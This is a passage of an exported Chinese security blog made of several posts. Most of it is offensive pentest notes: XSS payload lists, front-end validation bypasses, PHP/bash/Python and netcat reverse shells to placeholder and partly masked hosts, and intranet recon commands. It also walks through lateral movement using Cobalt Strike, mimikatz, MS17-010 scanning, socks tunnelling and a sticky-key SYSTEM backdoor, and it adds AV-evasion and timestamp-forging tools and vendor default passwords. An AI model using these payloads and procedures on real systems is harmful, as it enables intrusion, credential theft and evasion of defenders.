<thead>
<tr>
<th>all-body</th>
<th>domain</th>
<th>all-title</th>
<th>|body</th>
<th>title!</th>
</tr>
</thead>
<tbody><tr>
<td>河南</td>
<td>pay</td>
<td>读书</td>
<td>a</td>
<td>湖北</td>
</tr>
<tr>
<td>郑州</td>
<td>go</td>
<td>支付</td>
<td>b</td>
<td></td>
</tr>
<tr>
<td>开封</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<span id="more"></span>

<p>all-“标题”一行会与”标题”一列全组合</p>
<p>!代表减去标题；如：web.title!&#x3D;””</p>
<p>|代表括号中的或语句；如：(web.title&#x3D;”” || web.title&#x3D;””)</p>
<p>上方查询语句如下</p>
<ol>
<li>组合1**<br><code>body=&quot;河南&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;)</code> &amp;&amp; title !&#x3D; “湖北”<br>（<code>all-body</code>取”河南” + <code>all-title</code>取”读书” + 普通列<code>domain</code>取”pay”和”go” + OR列<code>body</code>取”a”或”b” + !取”湖北”）</li>
<li><strong>组合2</strong><br><code>body=&quot;河南&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code><br>（<code>all-body</code>取”河南” + <code>all-title</code>取”支付” + 其他条件同上）</li>
<li><strong>组合3</strong><br><code>body=&quot;郑州&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
<li><strong>组合4</strong><br><code>body=&quot;郑州&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
<li><strong>组合5</strong><br><code>body=&quot;开封&quot; &amp;&amp; title=&quot;读书&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
<li><strong>组合6</strong><br><code>body=&quot;开封&quot; &amp;&amp; title=&quot;支付&quot; &amp;&amp; domain=&quot;pay&quot; &amp;&amp; domain=&quot;go&quot; &amp;&amp; (body=&quot;a&quot;||body=&quot;b&quot;) &amp;&amp; title!= &quot;湖北&quot;</code></li>
</ol>
<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>“””生成所有搜索组合”””</p>
<p>“””构造搜索查询语句并编码”””</p>
<p>“””发送API请求”””</p>
<p>“””处理API返回结果”””</p>
<p>“””保存为Excel文件”””</p>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><p>延迟访问，避免请求过快</p>
<p>查询中的反斜杠错误</p>
<p>处理json考虑返回none</p>
<p><a href="https://github.com/cliayn/hunter_batch-Surveying">https://github.com/cliayn/hunter_batch-Surveying</a></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>project</tag>
      </tags>
  </entry>
  <entry>
    <title>console常见命令</title>
    <url>/2025/04/29/%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="控制台命令"><a href="#控制台命令" class="headerlink" title="控制台命令"></a>控制台命令</h1><h4 id="简单document"><a href="#简单document" class="headerlink" title="简单document"></a>简单document</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取所有匹配的 input 元素</span></span><br><span class="line"><span class="keyword">const</span> inputs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.un-input__inner&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第一个输入框的值</span></span><br><span class="line"><span class="keyword">const</span> firstInputValue = inputs[<span class="number">0</span>].<span class="property">value</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第二个输入框的值</span></span><br><span class="line"><span class="keyword">const</span> secondInputValue = inputs[<span class="number">1</span>].<span class="property">value</span>; </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>绕过前端认证提交表单的方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法一</span></span><br><span class="line">如果表单有 id 或 name，可以直接提交：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">submit</span>();  <span class="comment">// 直接提交，不触发前端验证</span></span><br><span class="line"></span><br><span class="line">如果不知道 form 的选择器，可以：</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();  <span class="comment">// 提交页面第一个表单</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法二</span></span><br><span class="line">如果输入框有 required 属性，可以移除它：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.un-input__inner&#x27;</span>).<span class="title function_">removeAttribute</span>(<span class="string">&#x27;required&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法三：</span></span><br><span class="line">在 &lt;form&gt; 上设置 novalidate 可以禁用 <span class="title class_">HTML5</span> 表单验证：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">setAttribute</span>(<span class="string">&#x27;novalidate&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法四：</span></span><br><span class="line">如果按钮有 onclick 事件阻止提交，可以覆盖它：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button.un-button&#x27;</span>).<span class="property">onclick</span> = <span class="literal">null</span>;</span><br><span class="line">然后手动触发点击：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button.un-button&#x27;</span>).<span class="title function_">click</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法五：</span></span><br><span class="line">直接构造api：</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/submit-url&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">    <span class="attr">field1</span>: <span class="string">&quot;value1&quot;</span>,</span><br><span class="line">    <span class="attr">field2</span>: <span class="string">&quot;value2&quot;</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>console</tag>
      </tags>
  </entry>
  <entry>
    <title>payload记录</title>
    <url>/2025/04/24/payload%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h1><h2 id="简单payload"><a href="#简单payload" class="headerlink" title="简单payload"></a>简单payload</h2><p>注：html解析<strong>HTML 实体编码</strong></p>
<p>​	例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;quot;   html解码成	&quot;</span><br></pre></td></tr></table></figure>

<p>注：<strong>JavaScript Unicode 转义（\uXXXX）</strong> 和 <strong>URL 编码（%XX）</strong></p>
<p>xxs需要注意被墙了可以尝试从转义或者解析角度注入</p>
<p>可以通过<a href="https://hackerone.com/hacktivity/cwe_discovery?id=CWE-79">网址</a>来查看以前大佬们提交的漏洞</p>
<span id="more"></span>

<h3 id="经典示例："><a href="#经典示例：" class="headerlink" title="经典示例："></a>经典示例：</h3><h5 id="get参数变更"><a href="#get参数变更" class="headerlink" title="get参数变更"></a>get参数变更</h5><p>示例poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.xxx.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br><span class="line">	解析：</span><br><span class="line"></span><br><span class="line">abc&#x27;%3breturn+false&#125;)%3b&#125;)%3balert`xss ;&lt;%2fscript&gt;</span><br></pre></td></tr></table></figure>



<h5 id="图片名称变更"><a href="#图片名称变更" class="headerlink" title="图片名称变更"></a>图片名称变更</h5><p>payload:       \ “&gt;&lt;img src&#x3D;1 onerror&#x3D;&quot; URL&#x3D;String;</p>
<p><img src="/../image/xss/expected_request.png"></p>
<h5 id="返回响应变更"><a href="#返回响应变更" class="headerlink" title="返回响应变更"></a>返回响应变更</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;+onmouseover=alert/*abcd*/`xss`</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>; alert<span class="string">`1`</span>; <span class="comment">//&quot;;</span></span><br><span class="line"><span class="number">0</span>||alert%0D<span class="string">`1`</span><span class="comment">//</span></span><br><span class="line">%0a<span class="string">`<span class="subst">$&#123;alert%0D(<span class="number">1</span>)&#125;</span>`</span></span><br><span class="line">onload=alert<span class="string">`1`</span> <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">\u0022\u003b+alert\u00601\u0060\u003b+<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#normal</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">#img</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">#svg</span><br><span class="line">&lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">    </span><br><span class="line">#标签</span><br><span class="line">&lt;aaaa id=&quot;c&quot; onfocus=&quot;alert(1)&quot; tabindex=0&gt;</span><br><span class="line">        </span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;Click me&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://116.205.161.165/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>python  jsingif.py  -i  hack.gif  “javascript:alert(‘Power_Liu’)”</p>
<p><a href="https://github.com/stayliv3/blog_material/blob/master/csp/jsingif.py">jsingif.py</a></p>
<p>用ai改了一下，python3也可以用</p>
<p><a href="../tool/xss/jsingif.py">jsingif.py</a></p>
<h1 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">8080</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>payload</tag>
      </tags>
  </entry>
  <entry>
    <title>内网信息搜集</title>
    <url>/2025/04/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<h1 id="Windows常用搜集命令："><a href="#Windows常用搜集命令：" class="headerlink" title="Windows常用搜集命令："></a>Windows常用搜集命令：</h1><table>
<thead>
<tr>
<th align="left"><code>ipconfig /all</code></th>
<th>查询网络配置信息</th>
</tr>
</thead>
<tbody><tr>
<td align="left">systeminfo | findstr &#x2F;B &#x2F;C:”OS 名称” &#x2F;C:”OS 版本”</td>
<td>查询操作系统版本-中文</td>
</tr>
<tr>
<td align="left">systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version”</td>
<td>查询操作系统版本-英文</td>
</tr>
<tr>
<td align="left">echo %PROCESSOR_ARCHITECTURE%</td>
<td>查看系统体系结构</td>
</tr>
<tr>
<td align="left">wmic product get name,version</td>
<td>安装软件版本信息</td>
</tr>
<tr>
<td align="left">powershell “Get-WmiObject -class Win32_Product | Select-Object -Property name,version”</td>
<td>收集软件版本信息</td>
</tr>
<tr>
<td align="left">wmic service list brief</td>
<td>查询本机服务信息</td>
</tr>
<tr>
<td align="left"><code>tasklist /svc</code></td>
<td>查询进程列表信息</td>
</tr>
<tr>
<td align="left">wmic startup get command,caption</td>
<td>查看启动程序信息</td>
</tr>
<tr>
<td align="left">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</td>
<td>查看计划任务信息</td>
</tr>
<tr>
<td align="left">net statistics workstation</td>
<td>查看主机开机时间</td>
</tr>
<tr>
<td align="left">net user</td>
<td>查询用户列表信息</td>
</tr>
<tr>
<td align="left">net localgroup administrators</td>
<td>获取本地管理员（通常含有域用户）</td>
</tr>
<tr>
<td align="left">query user || qwinsta</td>
<td>查看当前在线用户信息</td>
</tr>
<tr>
<td align="left">net session</td>
<td>查客户端会话信息(管理员权限)</td>
</tr>
<tr>
<td align="left"><code>netstat -ano</code></td>
<td>查询端口列表信息</td>
</tr>
<tr>
<td align="left"><code>Systeminfo</code></td>
<td>查询补丁列表信息</td>
</tr>
<tr>
<td align="left">wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
<td>wmic来识别安装在系统中的补丁</td>
</tr>
<tr>
<td align="left"><code>net share</code></td>
<td>查看本机共享信息</td>
</tr>
</tbody></table>
<span id="more"></span>

<h1 id="LINUX常用搜集命令："><a href="#LINUX常用搜集命令：" class="headerlink" title="LINUX常用搜集命令："></a>LINUX常用搜集命令：</h1><table>
<thead>
<tr>
<th><code>ifconfig -a</code> 或 <code>ip a</code></th>
<th>查询网络配置信息</th>
</tr>
</thead>
<tbody><tr>
<td><code>uname -a</code></td>
<td>查询系统内核及版本信息</td>
</tr>
<tr>
<td><code>cat /etc/os-release</code> 或 <code>lsb_release -a</code></td>
<td>查询操作系统版本信息</td>
</tr>
<tr>
<td><code>arch</code> 或 <code>uname -m</code></td>
<td>查看系统体系结构</td>
</tr>
<tr>
<td><code>dpkg -l</code> (Debian&#x2F;Ubuntu) 或 <code>rpm -qa</code> (RHEL&#x2F;CentOS)</td>
<td>安装软件版本信息</td>
</tr>
<tr>
<td><code>service --status-all</code> 或 <code>systemctl list-units --type=service</code></td>
<td>查询本机服务信息</td>
</tr>
<tr>
<td><code>ps aux</code></td>
<td>查询进程列表信息</td>
</tr>
<tr>
<td><code>ls /etc/init.d/</code> 或 <code>ls /etc/systemd/system/</code></td>
<td>查看启动程序信息</td>
</tr>
<tr>
<td><code>crontab -l</code> 或 <code>ls /etc/cron.*</code></td>
<td>查看计划任务信息</td>
</tr>
<tr>
<td><code>uptime</code></td>
<td>查看主机运行时间</td>
</tr>
<tr>
<td><code>cat /etc/passwd</code></td>
<td>查询用户列表信息</td>
</tr>
<tr>
<td><code>cat /etc/group</code></td>
<td>获取用户组信息（包括管理员组）</td>
</tr>
<tr>
<td><code>who</code> 或 <code>w</code></td>
<td>查看当前在线用户信息</td>
</tr>
<tr>
<td><code>netstat -antp</code> 或 <code>ss -tulnp</code></td>
<td>查询端口列表信息</td>
</tr>
<tr>
<td><code>apt list --installed</code> (Debian&#x2F;Ubuntu) 或 <code>yum list installed</code> (RHEL&#x2F;CentOS)</td>
<td>查询已安装软件包（包含部分补丁信息）</td>
</tr>
<tr>
<td><code>ls /mnt/</code> 或 <code>mount</code></td>
<td>查看挂载的共享信息</td>
</tr>
<tr>
<td><code>df -h</code></td>
<td>查看磁盘使用情况</td>
</tr>
<tr>
<td><code>free -h</code></td>
<td>查看内存使用情况</td>
</tr>
<tr>
<td><code>lscpu</code></td>
<td>查看CPU信息</td>
</tr>
<tr>
<td><code>dmidecode -t system</code></td>
<td>查看系统硬件信息（需要root权限）</td>
</tr>
<tr>
<td><code>journalctl -u &lt;service_name&gt;</code></td>
<td>查看特定服务的日志信息</td>
</tr>
<tr>
<td><code>cat /etc/hosts</code></td>
<td>查看主机名和IP映射</td>
</tr>
<tr>
<td><code>hostnamectl</code></td>
<td>查看主机名和系统信息</td>
</tr>
</tbody></table>
<p>注：</p>
<ol>
<li>部分命令可能需要root权限才能获取完整信息（可在命令前加<code>sudo</code>）</li>
<li>不同Linux发行版可能需要使用对应的包管理命令（apt&#x2F;yum&#x2F;dnf等）</li>
<li>对于较新的系统，推荐使用<code>ip</code>替代<code>ifconfig</code>，使用<code>ss</code>替代<code>netstat</code></li>
</ol>
<h1 id="内存码的注入："><a href="#内存码的注入：" class="headerlink" title="内存码的注入："></a>内存码的注入：</h1><p>[内存马注入]: <a href="https://github.com/pap1rman/JNDIExploit-modify">https://github.com/pap1rman/JNDIExploit-modify</a>	“参考如下：”</p>
<ul>
<li><a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a></li>
<li><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></li>
<li><a href="https://github.com/welk1n/JNDI-Injection-Bypass">https://github.com/welk1n/JNDI-Injection-Bypass</a></li>
</ul>
<h1 id="完整的内网渗透"><a href="#完整的内网渗透" class="headerlink" title="完整的内网渗透"></a>完整的内网渗透</h1><h2 id="简略："><a href="#简略：" class="headerlink" title="简略："></a>简略：</h2><p>1.获取shell—无论是sql注入提权还是webshell还是直接ssh等，获取shell后</p>
<p>2.cs上线—下载powershell等工具或者jar直接上线</p>
<p>3.如上信息搜集，进行横向，域内横向，类似于操作1.直接找shell</p>
<p>（3）.可以尝试<strong>sock代理</strong>，使同一网，进行msf的扫描，有的话就是捷径</p>
<p>（3）.有备份的话可以直接拷贝<strong>全量备份</strong>，它能在你本地横？可以cmd覆盖</p>
<p>（3）.<strong>基础操作</strong>：主机端口，内网web，系统&#x2F;框架漏洞</p>
<p>(技巧)[<a href="https://www.cnblogs.com/backlion/category/1181220.html]">https://www.cnblogs.com/backlion/category/1181220.html]</a></p>
<h2 id="详细"><a href="#详细" class="headerlink" title="详细"></a>详细</h2><p>1.通过fofa搜索到目标系统是采用weblogic框架，通过weblogic利用工具可执行命令，这里上传冰蝎一句话到目标网站系统。并查询到目标系统存在小众的防火墙，经测试该防火墙对ps脚本不拦截。</p>
<p>2.在VPS上通过cd自带的Scripted Web Delivery模块，直接创建一个web服务用于一键下载和执行powershell。</p>
<p>URL路径：&#x2F;a&#x2F;123   主机地址：目标系统IP   端口：80  监听器：https   类型：posershell</p>
<p>3.执行powershel，然后CS成功上线。</p>
<p>4.通过C命令查询目标系统信息,发现目标系统是win2012 ，目标内网IP为192.168.200.21</p>
<p>shell systeminfo</p>
<p>shell ipconfig</p>
<p>5。通过cs将ladon上传到目标系统中，通过ladon扫描内网系统.,发现目标有一个WEB服务主机。</p>
<p>landon 192.168.200.1&#x2F;24    OsScan</p>
<p>6。通过mimikatz成功读取到用户名和密码hash值，通过md5对密码的NTML进行解密，成功解密为P@sssw0rd。</p>
<p>7,通过ladon进行批量ms17-010扫描，发现存有几个系统存在ms17-010漏洞</p>
<p>landon 192.168.200.1&#x2F;24 MS17010</p>
<p>8.在公网VPS上执行以下命令，将1900端口收到的代理请求转交给反连1200端口的主机</p>
<p>ew -s rcsocks -l 1900 -e 1200</p>
<p>9.将ew通过冰蝎上传目标系统中，并执行以下命令,开启目标主机socks5服务并反向连接到中转机器的1200端口</p>
<p>ew -s rssocks -d xxx.xxx.xxx.xxx(公网VPS IP) -e 1200</p>
<p>10.本地WINDOWS在本地使用sockscap配置好socke5代理，本地虚拟机里面的kali的MSF，kali的代理配置比较方便，先vim &#x2F;etc&#x2F;proxychains.conf ，添加sock5嗲了</p>
<p>socks5  目标IP  1900</p>
<p>11.在kali下msf要挂代理，就直接：proxychains msfconsole，在windows中sockscap添加ie浏览器访问的socks5代理，用于内网web访问，但是测试弱口令发现无法进入。</p>
<p>12.继续信息收集，查看登录凭证，并有任何东西</p>
<p>shell  cmdkey  &#x2F;l</p>
<p>13.查看共享计算机列表，并尝试访问计算机C盘,发现备份计算机可以访问共享</p>
<p>shell  ne  view</p>
<p>ls   \VEEAM-BACKUP$</p>
<p>14.通过ping目标共享计算机，查询出IP地址为192.168.200.6</p>
<p>ping   VEEAM-BACKUP</p>
<p>15.在CS上创建一个监听器</p>
<p>中转—监听—名字（c2)、payload(windows&#x2F;beacon_reverse_tcp)、listen host :192.168.200.21  、listen port:4444</p>
<p>16.接着使用psexec_psh尝试上线192.168.200.6这台服务器,成功上线，起初发现该主机上并没有任何东西</p>
<p>jump  psexec _psh  192.168.200.6</p>
<p>17.通过之前ladon探测发现内网中22,1,5,11主机是linux系统，尝试弱口令，发现192.168.200.22存在弱口令，linux主机上并没有任何可利用的</p>
<p>ssh  192.168.200.22  root  123456</p>
<p>18.在VEEAM-BACKUP主机上发现了有一个Backup的文件，里面存放了三个机器的备份，它是一款叫Veeam® Backup &amp; Replication的软件，他的功能是专门为Vsphere等做备份。</p>
<p>19.发现VEEAM-BACKUP不出外网，这里通过7z将Backup文件进行命令打包压缩。在目标系统中的web目录下，通过命令共享将Backup文件拷贝到目标系统中。</p>
<p>19.在本地安装Backup &amp; Replication，并将备份文件进行恢复还原，发现登录窗口处有默认的用户名和密码以及IP，这个需要在目标内网中登录，这里可以通过在目标系统中通过cs开启sock4代理，本地通过Proxifier加载Backup &amp; Replication的sock4代理成功访问。</p>
<p>20.本地下载的那个全量备份在本地还原也很简单，只需要装了软件双击就回自动打开软件进行还原</p>
<p>21.通过老毛桃的win pe进入系统，这里重命名cmd.exe为osk.exe将原来C盘中的\windows\system32\osk.exe给覆盖了，这样子在开机的时候打开屏幕键盘就会弹出SYSTEM权限的命令行。</p>
<p>22.通过命令查询，发现还原的系统是域普通主机，这里通过命令添加用并将域用户修改密码后添加到本地管理员组成功进入了系统。</p>
<p>net user   hanli  quer1345 @  &#x2F;add</p>
<p>net localgroup administrators  hanli  &#x2F;add</p>
<p>23.在虚拟机中通过执行cs的后门成功上线，并通过cs的hasdump读取hash,并通过该hash进行域控HASH传递</p>
<h2 id="免杀项目："><a href="#免杀项目：" class="headerlink" title="免杀项目："></a>免杀项目：</h2><p><a href="https://github.com/wangfly-me/LoaderFly">https://github.com/wangfly-me/LoaderFly</a></p>
<p><a href="https://github.com/Pizz33/Qianji">https://github.com/Pizz33/Qianji</a></p>
<p>可以定期去github上关注一些好用的bof</p>
<h1 id="应对技巧："><a href="#应对技巧：" class="headerlink" title="应对技巧："></a>应对技巧：</h1><p>1.上传的木马都是新的</p>
<p>​	可以查看更改时间和最近操作得到，得到直接保存沙盒删除溯源一条龙</p>
<p>注：<a href="https://github.com/MsF-NTDLL/ChTimeStamp">https://github.com/MsF-NTDLL/ChTimeStamp</a></p>
<p>该项目可以实现修改文件时间</p>
<h1 id="默认口令："><a href="#默认口令：" class="headerlink" title="默认口令："></a>默认口令：</h1><p>系统管理员：system&#x2F;system<br>    集团管理员(A8-v5集团版) group-admin&#x2F;123456<br>    单位管理员(A8-V5企业版) admin1&#x2F;admin123456<br>    审计管理员(所有版本) audit-admin&#x2F;seeyon123456</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Computer-info</tag>
      </tags>
  </entry>
  <entry>
    <title>命令的熟悉</title>
    <url>/2025/04/23/%E5%91%BD%E4%BB%A4%E7%9A%84%E7%86%9F%E6%82%89/</url>
    <content><![CDATA[<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><p>nc、ls、待补充</p>
<span id="more"></span>

<h3 id="nc"><a href="#nc" class="headerlink" title="nc:"></a>nc:</h3><p>​	常用：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#正向连接</span></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> <span class="string">&quot;/bin/bash -i&quot;</span></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> /bin/bash <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment">#反向连接</span></span><br><span class="line">bash <span class="literal">-i</span> &gt; /dev/tcp/<span class="number">81</span>.X.X.X/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#只允许192.168.1.100连接</span></span><br><span class="line"></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> <span class="string">&quot;/bin/bash -i&quot;</span> <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#监听并记录访问者信息</span></span><br><span class="line"></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-v</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">tee</span> <span class="literal">-a</span> access.log</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th align="left"><strong>用途</strong></th>
<th align="left"><strong>命令示例</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">临时聊天</td>
<td align="left"><code>nc -l -p 8080</code> + <code>nc &lt;IP&gt; 8080</code></td>
<td align="left">双向文本通信</td>
</tr>
<tr>
<td align="left">文件传输（发送→接收）</td>
<td align="left"><code>nc -l -p 8080 &gt; file</code> + <code>nc &lt;IP&gt; 8080 &lt; file</code></td>
<td align="left">替代SCP&#x2F;FTP</td>
</tr>
<tr>
<td align="left">反向Shell</td>
<td align="left"><code>nc -l -p 8080 -e /bin/bash</code> + <code>nc &lt;IP&gt; 8080</code></td>
<td align="left"><strong>高风险！仅测试用</strong></td>
</tr>
<tr>
<td align="left">端口扫描</td>
<td align="left"><code>nc -zv &lt;IP&gt; 8080</code></td>
<td align="left">检查端口状态</td>
</tr>
<tr>
<td align="left">HTTP调试</td>
<td align="left"><code>nc -l -p 8080</code> + <code>curl http://&lt;IP&gt;:8080</code></td>
<td align="left">查看原始HTTP请求</td>
</tr>
<tr>
<td align="left">TCP代理</td>
<td align="left">&#96;nc -l -p 8080</td>
<td align="left">nc &lt;目标IP&gt; 80&#96;</td>
</tr>
<tr>
<td align="left">十六进制调试</td>
<td align="left">&#96;nc -l -p 8080</td>
<td align="left">hexdump -C&#96;</td>
</tr>
<tr>
<td align="left">持久监听</td>
<td align="left"><code>while true; do nc -l -p 8080; done</code></td>
<td align="left">支持多次连接</td>
</tr>
<tr>
<td align="left">SSL加密通信</td>
<td align="left"><code>ncat -l -p 8080 --ssl</code> + <code>ncat &lt;IP&gt; 8080 --ssl</code></td>
<td align="left">需安装<code>ncat</code></td>
</tr>
</tbody></table>
<p>注：nc -l -p 8080 -e “&#x2F;bin&#x2F;bash -i”			&#x2F;&#x2F;j交互模式</p>
